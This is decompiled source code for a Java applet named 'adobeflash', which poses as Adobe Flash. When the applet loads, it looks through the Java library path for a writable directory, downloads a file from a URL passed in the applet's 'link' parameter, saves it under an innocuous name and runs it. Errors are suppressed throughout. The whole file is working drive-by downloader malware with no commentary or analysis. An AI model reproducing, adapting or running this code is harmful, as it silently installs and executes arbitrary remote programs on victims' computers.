import java.io.File;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.net.URL;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class adobeflash extends Applet
{
    public void CallJavaScript() {
    }
    
    private boolean DownloadFile(final String s, final String s2) {
        try {
            final URL url = new URL(s);
            final BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(new FileOutputStream(s2));
            final InputStream inputStream = url.openConnection().getInputStream();
            final byte[] array = new byte[1024];
            long n = 0L;
            int read;
            while ((read = inputStream.read(array)) != -1) {
                bufferedOutputStream.write(array, 0, read);
                n += read;
            }
            if (inputStream != null) {
                inputStream.close();
            }
            if (bufferedOutputStream != null) {
                bufferedOutputStream.close();
            }
            return true;
        }
        catch (Exception ex) {
            return false;
        }
    }
    
    private boolean isWriteable(final String s, final String s2) {
        try {
            final FileOutputStream fileOutputStream = new FileOutputStream(s + File.pathSeparator + s2);
            fileOutputStream.write(1);
            fileOutputStream.close();
            new File(s + File.pathSeparator + s2).delete();
            return true;
        }
        catch (Exception ex) {
            return false;
        }
    }
    
    @Override
    public void init() {
        final String s = "b470503.phx";
        final String s2 = "147hhj45";
        try {
            final String[] split = System.getProperty("java.library.path").split(File.pathSeparator);
            String s3 = null;
            final String parameter = this.getParameter("link");
            for (int i = 0; i < split.length; ++i) {
                final String s4 = split[i];
                if (this.isWriteable(s4, s2)) {
                    s3 = s4;
                    break;
                }
            }
            if (s3 != null && this.DownloadFile(parameter, s3 + "\\" + s) && Runtime.getRuntime().exec(s3 + "\\" + s) != null) {
                this.CallJavaScript();
            }
        }
        catch (Exception ex) {}
    }
}
